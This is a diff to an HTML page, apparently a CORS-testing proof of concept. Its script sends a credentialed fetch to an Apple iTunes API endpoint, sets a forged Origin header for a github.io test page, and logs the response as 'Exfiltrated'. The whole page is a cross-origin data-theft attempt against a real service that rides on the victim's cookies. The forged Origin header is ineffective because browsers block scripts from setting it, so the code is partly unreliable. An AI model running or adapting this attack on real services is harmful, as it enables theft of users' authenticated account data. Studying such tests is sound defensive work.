@@ -13,7 +13,7 @@
         fetch("https://uclient-api.itunes.apple.com/WebObjects/MZStorePlatform.woa/wa/lookup", {
             method: "GET",
             headers: {
-                "Origin": "https://bolich12.github.io/cors-test"
+                "Origin": "https://bolich12.github.io/cors-test/cors-test.html"
             },
             credentials: "include"
        })
@@ -21,8 +21,6 @@
     .then(data => {
         console.log("Exfiltrated:", data);
     });
-        .then(data => console.log("Response data:", data))
-        .catch(error => console.error("Error occurred:", error));
     </script>
 </body>
 </html>
